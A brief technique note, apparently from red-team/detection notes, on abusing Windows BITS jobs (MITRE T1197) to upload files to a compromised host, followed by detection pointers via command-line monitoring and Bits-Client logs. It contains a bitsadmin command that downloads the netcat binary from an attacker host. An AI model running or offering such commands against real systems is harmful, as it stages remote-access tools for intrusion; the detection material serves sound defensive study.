---
description: File upload to the compromised system.
---

# BITS Jobs

## Execution

```c
// attacker@victim
bitsadmin /transfer myjob /download /priority high http://10.0.0.5/nc64.exe c:\temp\nc.exe
```

![[bits-download.png]]

## Observations

Commandline arguments monitoring can help discover bitsadmin usage:

![[bits-cmdline.png]]

`Application Logs > Microsoft > Windows > Bits-Client > Operational` shows logs related to jobs, which you may want to monitor as well. An example of one of the jobs:

![[bits-operational-logs.png]]

## References

[attack.mitre.org/wiki/Technique/T1197](https://attack.mitre.org/wiki/Technique/T1197)

